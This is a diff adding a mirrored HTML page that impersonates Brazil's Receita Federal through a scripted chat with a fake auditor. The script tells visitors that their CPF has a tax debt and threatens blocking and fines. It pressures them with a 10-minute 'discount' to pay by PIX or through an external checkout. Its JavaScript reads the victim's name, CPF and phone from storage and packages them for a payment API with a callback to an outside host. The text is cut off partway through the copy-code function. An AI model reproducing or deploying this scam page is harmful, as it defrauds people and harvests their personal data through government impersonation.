@@ -1,0 +1,1773 @@
+<!DOCTYPE html><html lang="pt-BR">
+<!-- Mirrored from portalgov-com-br.netlify.app/chat/?cpf= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Feb 2026 18:19:34 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat - Receita Federal</title>
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <!-- Tailwind CDN -->
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <!-- QR Code Generator - QRious Library -->
+    <script src="js/qrious.min.js"></script>
+    <!-- Google Fonts - Sora -->
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Sora', 'sans-serif'],
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        :root {
+            --receita-blue: #044785;
+            --receita-success: #28a745;
+            --receita-danger: #dc3545;
+        }
+
+        @keyframes slideDown {
+            0% {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        body {
+            font-family: 'Sora', sans-serif;
+            background-color: #fff;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .chat-container {
+            overflow-y: auto;
+            padding: 10px 20px;
+            scroll-behavior: smooth;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-container::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        .chat-container::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+
+        .chat-container::-webkit-scrollbar-thumb {
+            background: #c9c9c9;
+            border-radius: 10px;
+        }
+
+        .message-bubble {
+            margin-bottom: 16px;
+            max-width: 75%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .incoming-message {
+            align-self: flex-start;
+            margin-right: auto;
+            padding-left: 0px;
+            margin-left: -10px;
+        }
+
+        .outgoing-message {
+            align-self: flex-end;
+            margin-left: auto;
+            align-items: flex-end;
+            padding-right: 0px;
+            margin-right: -10px;
+        }
+
+        .message-content {
+            padding: 14px 18px;
+            border-radius: 18px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            margin-top: 4px;
+            position: relative;
+            line-height: 1.5;
+        }
+
+        .incoming-message .message-content {
+            background-color: #044785;
+            border-top-left-radius: 2px;
+            text-align: left;
+            color: white;
+            min-width: 200px;
+        }
+
+        .outgoing-message .message-content {
+            background-color: #d4d4d4;
+            border-top-right-radius: 2px;
+            text-align: right;
+            border-right: 2px solid #999;
+        }
+
+        .chat-avatar {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--receita-blue);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .status-indicator {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background-color: var(--receita-success);
+            border: 2px solid white;
+        }
+
+        .chat-options {
+            margin-top: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding-left: 0px;
+            margin-left: -10px;
+            max-width: 75%;
+        }
+
+        .option-button {
+            background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+            border: 1px solid #d0d0d0;
+            border-radius: 2px;
+            padding: 16px 20px;
+            text-align: left;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            font-weight: 500;
+            box-shadow:
+                0 4px 8px rgba(0, 0, 0, 0.1),
+                inset 0 1px 0 rgba(255, 255, 255, 0.5),
+                inset 0 -1px 0 rgba(0, 0, 0, 0.1);
+            font-size: 1.05rem;
+            margin-bottom: 12px;
+            color: #333;
+        }
+
+        .option-button:hover {
+            background: linear-gradient(145deg, #f0f0f0, #ffffff);
+            border-color: var(--receita-blue);
+            transform: translateY(-2px);
+            box-shadow:
+                0 6px 16px rgba(0, 0, 0, 0.15),
+                inset 0 1px 0 rgba(255, 255, 255, 0.7),
+                inset 0 -1px 0 rgba(0, 0, 0, 0.05);
+        }
+
+        .option-button i {
+            font-size: 1.2rem;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        .avatar-container {
+            position: relative;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .typing-animation {
+            display: flex;
+            align-items: center;
+            column-gap: 5px;
+            height: 15px;
+        }
+
+        .typing-animation .dot {
+            display: block;
+            width: 7px;
+            height: 7px;
+            opacity: 0.8;
+            border-radius: 50%;
+            background-color: white;
+            animation: loadingFade 1s infinite;
+        }
+
+        .typing-animation .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .typing-animation .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .typing-animation .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes loadingFade {
+            0% {
+                opacity: 0.3;
+                transform: scale(0.8);
+            }
+
+            50% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+
+            100% {
+                opacity: 0.3;
+                transform: scale(0.8);
+            }
+        }
+
+        @media (max-width: 576px) {
+            .message-bubble {
+                max-width: 85%;
+            }
+
+            .chat-container {
+                height: 55vh;
+                padding: 15px;
+            }
+        }
+    </style>
+
+</head><body>
+    <script>
+        if (!sessionStorage.getItem('jaRecarregado')) {
+            sessionStorage.setItem('jaRecarregado', 'true');
+            window.location.href = window.location.href;
+        }
+    </script>
+
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="images/logogov.jpg" alt="Logotipo Governo" class="h-6">
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- Receita Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="images/Gov.br_logo.svg" alt="Logo Receita" class="h-8 mx-auto">
+        </div>
+    </div>
+    <!-- Attendant Info -->
+    <div class="bg-gray-100 text-gray-800 px-4 md:px-8 py-3">
+        <div class="max-w-7xl mx-auto">
+            <div class="flex items-center w-full">
+                <div class="avatar-container mr-4">
+                    <img src="images/20250730-1844-Auditora-em-Escrito-rio-remix-01k1emk074ffjsxdk3xfe9b385.png" class="chat-avatar" alt="Tereza Alencar">
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="flex-1">
+                    <h2 class="header-title text-gray-800 text-lg font-semibold">Tereza Alencar</h2>
+                    <p class="header-subtitle text-gray-600 text-sm">Auditora da Receita Federal</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main class="container mx-auto px-4 py-2">
+        <div class="max-w-6xl mx-auto">
+            <!-- Chat Body -->
+            <div class="overflow-hidden position-relative">
+                <div class="chat-container" id="chatContainer" style="height: calc(100vh - 200px); min-height: 400px;">
+                    <!-- Messages will be inserted here by JavaScript -->
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        // Get customer data from localStorage (saved when accessing via CPF slug)
+        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+
+        // Function to properly capitalize names
+        function capitalizeNames(name) {
+            if (!name) return 'Nome não informado';
+            return name.toLowerCase().split(' ').map(word =>
+                word.charAt(0).toUpperCase() + word.slice(1)
+            ).join(' ');
+        }
+
+        const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
+        const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
+        const cpf = customerData.cpf || 'CPF não informado';
+
+        // Configuração - Carrega valor do servidor
+        let CONFIG = {
+            defaultAmount: 138.45 // Valor padrão, será atualizado do servidor
+        };
+
+        // Função helper para formatar valor monetário (R$ 138,45)
+        function formatCurrency(value) {
+            if (typeof value === 'undefined' || value === null) {
+                value = CONFIG.defaultAmount;
+            }
+            return value.toFixed(2).replace('.', ',');
+        }
+
+        // Função helper para obter valor formatado completo (R$ 138,45)
+        function getFormattedAmount(value) {
+            if (typeof value === 'undefined' || value === null) {
+                value = CONFIG.defaultAmount;
+            }
+            return `R$ ${formatCurrency(value)}`;
+        }
+
+        // Carrega configuração do servidor (valor do PIX)
+        async function loadConfig() {
+            try {
+                const response = await fetch('pix-api0ecc.html?action=get-config');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success && data.pix_amount) {
+                        CONFIG.defaultAmount = parseFloat(data.pix_amount);
+                        console.log('✅ Valor do PIX carregado:', CONFIG.defaultAmount);
+                    }
+                }
+            } catch (error) {
+                console.warn('⚠️ Não foi possível carregar configuração do servidor, usando valor padrão');
+            }
+        }
+
+        // Carrega configuração ao iniciar
+        loadConfig();
+
+        // API endpoint
+        const API_ENDPOINT = 'pix-api.html';
+
+        function buildPixPayload() {
+            const amount = CONFIG.defaultAmount;
+            const normalizedCpf = (customerData.cpf || '').replace(/\D/g, '');
+
+            // Valida CPF (deve ter 11 dígitos)
+            if (!normalizedCpf || normalizedCpf.length < 11) {
+                console.error('CPF inválido:', normalizedCpf);
+                // Usa CPF de fallback se inválido
+                const fallbackCpf = '00000000000';
+                console.warn('Usando CPF de fallback:', fallbackCpf);
+            }
+
+            // Gera external_id único baseado no CPF e timestamp
+            const externalId = `PIX_${normalizedCpf || '00000000000'}_${Date.now()}`;
+
+            // URL do callback (webhook) - Goldiix
+            const callbackUrl = 'https://raspakipix.online/consulta.portalurgente.is/a/goldiix-webhook.php';
+
+            // Valida email
+            let email = customerData.email || 'cliente@example.com';
+            if (!email.includes('@')) {
+                email = 'cliente@example.com';
+            }
+
+            // Valida nome
+            let name = fullName || 'Cliente';
+            if (!name || name.trim().length === 0) {
+                name = 'Cliente';
+            }
+
+            // Valida telefone (obrigatório na Goldiix)
+            let phone = customerData.phone || customerData.telefone || '';
+            phone = phone.replace(/\D/g, ''); // Remove caracteres não numéricos
+            if (!phone || phone.length < 10) {
+                phone = '11999999999'; // Telefone padrão se não fornecido
+            }
+
+            return {
+                amount: amount,
+                external_id: externalId,
+                callback_url: callbackUrl,
+                payer: {
+                    name: name.trim(),
+                    email: email.trim(),
+                    document: normalizedCpf || '00000000000',
+                    phone: phone // Obrigatório na Goldiix
+                }
+            };
+        }
+
+        // Função para obter parâmetros UTM
+        async function getUtmParams() {
+            // Extrai parâmetros UTM da URL atual
+            const urlParams = new URLSearchParams(window.location.search);
+
+            // Também verifica no referrer se disponível
+            let referrerParams = new URLSearchParams();
+            if (document.referrer) {
+                try {
+                    const referrerUrl = new URL(document.html);
+                    referrerParams = new URLSearchParams(referrerUrl.search);
+                } catch (e) {
+                    console.warn('Erro ao parsear referrer:', e);
+                }
+            }
+
+            const utmParams = {
+                src: urlParams.get('src') || referrerParams.get('src') || null,
+                sck: urlParams.get('sck') || referrerParams.get('sck') || null,
+                utm_source: urlParams.get('utm_source') || referrerParams.get('utm_source') || null,
+                utm_campaign: urlParams.get('utm_campaign') || referrerParams.get('utm_campaign') || null,
+                utm_medium: urlParams.get('utm_medium') || referrerParams.get('utm_medium') || null,
+                utm_content: urlParams.get('utm_content') || referrerParams.get('utm_content') || null,
+                utm_term: urlParams.get('utm_term') || referrerParams.get('utm_term') || null
+            };
+
+            // Se não tiver na URL, tenta do localStorage
+            if (!utmParams.utm_source && !utmParams.src) {
+                const storedUtm = localStorage.getItem('utmParams');
+                if (storedUtm) {
+                    try {
+                        const parsed = JSON.parse(storedUtm);
+                        Object.assign(utmParams, parsed);
+                    } catch (e) {
+                        console.warn('Erro ao parsear UTM do localStorage:', e);
+                    }
+                }
+            }
+
+            // Salva UTM no localStorage para uso futuro
+            if (utmParams.utm_source || utmParams.src) {
+                localStorage.setItem('utmParams', JSON.stringify(utmParams));
+            }
+
+            return utmParams;
+        }
+
+        // Função removida - agora a API retorna dados normalizados
+
+        // Chat sequence with tax debt notification
+        const chatSequence = [
+            {
+                message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
+                delay: 8000
+            },
+            {
+                message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${fullName}.`,
+                delay: 15000,
+                requestPhone: true
+            },
+            {
+                message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
+                delay: 14000
+            },
+            {
+                message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 1.985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
+                delay: 13000
+            },
+            {
+                message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 67%, reduzindo o débito de R$ 419,55 para apenas ${getFormattedAmount()}. ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
+                delay: 12000,
+                showOptions: 'debtOptions'
+            }
+        ];
+
+        // Chat container
+        const chatContainer = document.getElementById('chatContainer');
+
+        // Add message to chat
+        function addMessage(text, isIncoming = true, scrollToBottom = true) {
+            const messageDiv = document.createElement('div');
+            messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
+
+            messageDiv.innerHTML = `
+        <div class="message-content">
+            ${text.replace(/\n/g, '<br>')}
+        </div>
+    `;
+
+            chatContainer.appendChild(messageDiv);
+
+            if (scrollToBottom) {
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }
+        }
+
+        // Show typing indicator
+        function showTyping(duration = 3000) {
+            return new Promise(resolve => {
+                const typingDiv = document.createElement('div');
+                typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
+                typingDiv.style.paddingLeft = '0px';
+                typingDiv.style.marginLeft = '-10px';
+                typingDiv.innerHTML = `
+            <div class="message-content d-flex align-items-center" style="background-color: #044785; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                <div class="typing-animation">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+        `;
+
+                chatContainer.appendChild(typingDiv);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+
+                setTimeout(() => {
+                    if (typingDiv.parentNode) {
+                        typingDiv.parentNode.removeChild(typingDiv);
+                    }
+                    resolve();
+                }, duration);
+            });
+        }
+
+        // Show options
+        function showOptions(optionsId) {
+            let optionsHtml = '';
+
+            if (optionsId === 'debtOptions') {
+                optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora mesmo', 'redirectToPayment')">
+                    <i class="fas fa-check-circle" style="color: var(--receita-success);"></i> 
+                    Vou quitar o débito agora mesmo
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Autorizo o bloqueio do meu CPF', 'confirmBlock')">
+                    <i class="fas fa-times-circle" style="color: var(--receita-danger);"></i> 
+                    Autorizo o bloqueio do meu CPF
+                </button>
+            </div>
+        `;
+            }
+
+            if (optionsHtml) {
+                chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
+                chatContainer.scrollTop = chatContainer.scrollHeight;
+            }
+        }
+
+        // Handle option click
+        function handleOptionClick(button, responseText, nextAction) {
+            // Add user response to chat
+            addMessage(responseText, false, true);
+
+            // Remove the options container
+            const optionsContainer = button.closest('.chat-options');
+            if (optionsContainer) {
+                optionsContainer.remove();
+            }
+
+            // Show typing and continue conversation
+            setTimeout(async () => {
+                if (nextAction === 'redirectToPayment') {
+                    await showTyping(4000);
+                    addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade após hoje.`, true, true);
+
+                    await showTyping(5000);
+                    addMessage('Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.', true, true);
+
+                    // Show payment button
+                    setTimeout(() => {
+                        showPaymentButton();
+                    }, 2000);
+                } else if (nextAction === 'confirmBlock') {
+                    await showTyping(8000);
+                    addMessage('Entendido. Vou iniciar o processo de bloqueio do seu CPF conforme os procedimentos da Receita Federal. O bloqueio será efetivado em breve. Obrigada pela atenção.', true, true);
+                }
+            }, 1000);
+        }
+
+        // Variável global para armazenar o link de checkout
+        let checkoutUrl = 'https://comprasprotegidas.com.br/xdSJlkvF'; // URL padrão
+
+        // Carrega link de checkout do servidor
+        async function loadCheckoutUrl() {
+            try {
+                const response = await fetch('get-checkout-url.php');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success && data.checkout_url) {
+                        checkoutUrl = data.checkout_url;
+                        console.log('✅ Link de checkout carregado:', checkoutUrl);
+                    }
+                }
+            } catch (error) {
+                console.warn('⚠️ Não foi possível carregar link de checkout, usando padrão');
+            }
+        }
+
+        // Carrega link de checkout ao iniciar
+        loadCheckoutUrl();
+
+        // Função para redirecionar para o checkout
+        function redirectToCheckout() {
+            console.log('🔄 Redirecionando para checkout:', checkoutUrl);
+            window.location.href = checkoutUrl;
+        }
+
+        // Show payment button
+        function showPaymentButton() {
+            const buttonHtml = `
+        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <button class="payment-button" onclick="redirectToCheckout()" style="
+                background: #28a745;
+                border: none;
+                border-radius: 2px;
+                padding: 16px 24px;
+                color: white;
+                font-weight: 600;
+                font-size: 1.1rem;
+                cursor: pointer;
+                width: 100%;
+                text-align: center;
+                transition: all 0.3s ease;
+                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
+               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
+                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
+                Realizar pagamento
+            </button>
+        </div>
+    `;
+
+            chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+        }
+
+
+        // Funções removidas - agora são gerenciadas pela API PHP
+
+        function showLoadingModal() {
+            const modalHtml = `
+        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto;">
+            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+                <div style="text-align: center;">
+                    <div class="spinner" style="
+                        width: 60px;
+                        height: 60px;
+                        border: 6px solid #f3f3f3;
+                        border-top: 6px solid #044785;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 30px auto;
+                    "></div>
+                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 15px; font-size: 1.3rem;">Aguardando pagamento...</h2>
+                    <p style="color: #666; font-size: 1rem;">Gerando DARF, por favor aguarde...</p>
+                </div>
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+
+            document.body.insertAdjacentHTML('beforeend', modalHtml);
+        }
+
+        /**
+         * Gera QR Code do PIX usando biblioteca QRious
+         * @param {string} pixCode - Código PIX completo
+         * @returns {Promise<string|null>} - Data URL da imagem do QR Code ou null em caso de erro
+         */
+        async function generateQRCodeFromPix(pixCode) {
+            try {
+                // Verifica se a biblioteca QRious está carregada
+                if (typeof QRious === 'undefined') {
+                    console.error('❌ Biblioteca QRious não carregada. Tentando carregar...');
+
+                    // Tenta carregar a biblioteca dinamicamente
+                    await loadQRiousLibrary();
+
+                    // Verifica novamente
+                    if (typeof QRious === 'undefined') {
+                        console.error('❌ Não foi possível carregar a biblioteca QRious');
+                        return null;
+                    }
+                }
+
+                console.log('✅ Gerando QR Code do PIX...', {
+                    pixCodeLength: pixCode.length,
+                    pixCodePreview: pixCode.substring(0, 50) + '...'
+                });
+
+                // Cria elemento canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = 300;
+                canvas.height = 300;
+
+                // Cria instância QRious com configurações otimizadas
+                const qr = new QRious({
+                    element: canvas,
+                    value: pixCode,
+                    size: 300,
+                    background: '#ffffff',
+                    foreground: '#000000',
+                    level: 'H', // Nível de correção de erro alto para PIX
+                    padding: 25
+                });
+
+                // Converte canvas para data URL
+                const qrCodeDataURL = canvas.toDataURL('image/png');
+
+                console.log('✅ QR Code gerado com sucesso', {
+                    dataURLLength: qrCodeDataURL.length,
+                    canvasSize: `${canvas.width}x${canvas.height}`
+                });
+
+                return qrCodeDataURL;
+            } catch (error) {
+                console.error('❌ Erro ao gerar QR Code:', error);
+                console.error('Stack trace:', error.stack);
+                return null;
+            }
+        }
+
+        /**
+         * Carrega a biblioteca QRious dinamicamente se não estiver disponível
+         */
+        function loadQRiousLibrary() {
+            return new Promise((resolve, reject) => {
+                // Verifica se já está carregada
+                if (typeof QRious !== 'undefined') {
+                    resolve();
+                    return;
+                }
+
+                // Cria script tag
+                const script = document.createElement('script');
+                script.src = '../../cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js';
+                script.onload = () => {
+                    console.log('✅ Biblioteca QRious carregada com sucesso');
+                    resolve();
+                };
+                script.onerror = () => {
+                    console.error('❌ Erro ao carregar biblioteca QRious');
+                    reject(new Error('Não foi possível carregar a biblioteca QRious'));
+                };
+
+                document.head.appendChild(script);
+            });
+        }
+
+        function showPixModal(data) {
+            // Remove loading modal and show PIX modal
+            const existingModal = document.getElementById('pixModal');
+            if (existingModal) {
+                existingModal.remove();
+            }
+
+            // Get PIX code from API response (formato Goldiix: pix.pix_qrcode_text)
+            const pixCode = data.pixCode ||
+                data.pix_code ||
+                (data.pix && data.pix.pix_qrcode_text) ||
+                (data.pix && data.pix.qr_code) ||
+                null;
+
+            if (!pixCode) {
+                console.error('❌ Código PIX não encontrado na resposta da API', {
+                    data: data,
+                    dataKeys: Object.keys(data),
+                    pixKeys: data.pix ? Object.keys(data.pix) : []
+                });
+                alert('Erro: Código PIX não recebido da API. Verifique os logs do console.');
+                return;
+            }
+
+            console.log('✅ Código PIX recebido com sucesso:', {
+                pixCodeLength: pixCode.length,
+                pixCodePreview: pixCode.substring(0, 50) + '...',
+                pixCodeEnd: '...' + pixCode.substring(pixCode.length - 20)
+            });
+
+            // Generate QR code from PIX code usando JavaScript
+            console.log('🔄 Iniciando geração do QR Code do PIX...');
+
+            generateQRCodeFromPix(pixCode).then(qrCodeDataURL => {
+                if (!qrCodeDataURL) {
+                    console.error('❌ Erro ao gerar QR Code');
+                    alert('Erro ao gerar QR Code. O código PIX ainda está disponível para copiar e colar.');
+                    // Continua mesmo sem QR Code
+                } else {
+                    console.log('✅ QR Code gerado com sucesso', {
+                        dataURLLength: qrCodeDataURL.length,
+                        preview: qrCodeDataURL.substring(0, 50) + '...'
+                    });
+                }
+
+                // Start payment monitoring
+                const transactionId = data.transaction_id || data.transactionId || data.orderId || data.order_id;
+                console.log('🔍 Dados PIX recebidos:', data);
+                console.log('🆔 Transaction ID identificado:', transactionId);
+
+                if (transactionId) {
+                    console.log('✅ Iniciando monitoramento de pagamento para:', transactionId);
+                    startPaymentMonitoring(transactionId);
+                } else {
+                    console.warn('⚠️ Nenhum transaction_id encontrado nos dados. Monitoramento não será iniciado.');
+                }
+
+                // Monta o HTML do modal com QR Code
+                const qrCodeSection = qrCodeDataURL ? `
+            <div style="text-align: center; margin: 20px 0;">
+                <h3 style="color: #044785; font-weight: 600; margin-bottom: 15px; font-size: 1.1rem;">
+                    <i class="fas fa-qrcode" style="margin-right: 8px;"></i>
+                    Escaneie o QR Code com seu app bancário
+                </h3>
+                <div style="display: inline-block; padding: 15px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border: 2px solid #044785;">
+                    <img id="pixQRCode" src="${qrCodeDataURL}" alt="QR Code PIX" style="width: 250px; height: 250px; display: block; max-width: 100%;">
+                </div>
+                <p style="color: #666; font-size: 0.85rem; margin-top: 10px;">
+                    Ou use o código PIX Copia e Cola abaixo
+                </p>
+            </div>
+        ` : `
+            <div style="text-align: center; margin: 20px 0;">
+                <div style="background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107; display: inline-block;">
+                    <p style="color: #856404; font-size: 0.9rem; margin: 0;">
+                        <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
+                        Use o código PIX Copia e Cola abaixo para pagar
+                    </p>
+                </div>
+            </div>
+        `;
+
+                const modalHtml = `
+            <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto; animation: fadeIn 0.3s ease-out;">
+                <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; animation: slideDown 0.3s ease-out;">
+                    <div style="text-align: center; margin-bottom: 30px;">
+                        <h2 style="color: #044785; font-weight: 600; margin-bottom: 10px; font-size: 1.5rem;">
+                            <i class="fas fa-check-circle" style="color: #28a745; margin-right: 10px;"></i>
+                            DARF Gerado com Sucesso
+                        </h2>
+                        <p style="color: #666; font-size: 1rem;">Valor: R$ ${CONFIG.defaultAmount.toFixed(2).replace('.', ',')}</p>
+                    </div>
+
+                    ${qrCodeSection}
+
+                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+                        <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">Código PIX (Copia e Cola) - Valor: ${getFormattedAmount()}:</label>
+                        <div style="margin-bottom: 10px;">
+                            <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 120px; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-family: monospace; font-size: 0.85rem; resize: none; line-height: 1.3; word-wrap: break-word;">${pixCode}</textarea>
+                            <input type="hidden" id="pixCodeInputReal" value="${pixCode}">
+                        </div>
+                        <button onclick="copyPixCode()" style="width: 100%; padding: 12px 16px; background: #044785; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                            <i class="fas fa-copy"></i> Copiar código PIX completo
+                        </button>
+                    </div>
+
+                    <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #ffc107;">
+                        <h4 style="color: #856404; margin-bottom: 15px; font-size: 1rem; font-weight: 600;">
+                            <i class="fas fa-info-circle" style="margin-right: 8px;"></i>
+                            Como pagar com PIX Copia e Cola:
+                        </h4>
+                        <div style="color: #856404; font-size: 0.9rem; line-height: 1.5;">
+                            <p style="margin-bottom: 8px;"><strong>1.</strong> Copie o código PIX clicando no botão acima</p>
+                            <p style="margin-bottom: 8px;"><strong>2.</strong> Abra o aplicativo do seu banco</p>
+                            <p style="margin-bottom: 8px;"><strong>3.</strong> Procure pela opção "PIX" e depois "Copia e Cola"</p>
+                            <p style="margin-bottom: 0;"><strong>4.</strong> Cole o código copiado e confirme o pagamento de ${getFormattedAmount()}</p>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 20px; padding: 15px; background: #e8f4fd; border-radius: 8px; border-left: 4px solid #044785;">
+                        <p style="color: #044785; font-weight: 600; margin-bottom: 10px;">
+                            <i class="fas fa-clock" style="margin-right: 8px;"></i>
+                            Tempo para pagamento: 10 minutos
+                        </p>
+                        <p style="color: #666; font-size: 0.9rem;">Após o pagamento, retorne imediatamente a esta página para confirmação.</p>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button onclick="closePixModal()" style="padding: 12px 24px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600;">
+                            Fechar
+                        </button>
+                    </div>
+                </div>
+            </div>
+            <style>
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            </style>
+        `;
+
+                document.body.insertAdjacentHTML('beforeend', modalHtml);
+            }).catch(error => {
+                console.error('❌ Erro ao gerar QR Code:', error);
+                alert('Erro ao gerar QR Code. Tente novamente.');
+            });
+        }
+
+        function copyPixCode() {
+            // Get the real PIX code from hidden input
+            const realPixInput = document.getElementById('pixCodeInputReal');
+            const realPixCode = realPixInput.value;
+
+            try {
+                // Copy the real PIX code to clipboard
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(realPixCode);
+                } else {
+                    // Fallback for older browsers
+                    const textArea = document.createElement('textarea');
+                    textArea.value = realPixCode;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    textArea.setSelectionRange(0, 99999);
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                }
+
+                const button = event.target.closest('button');
+                const originalText = button.innerHTML;
+                button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                button.style.background = '#28a745';
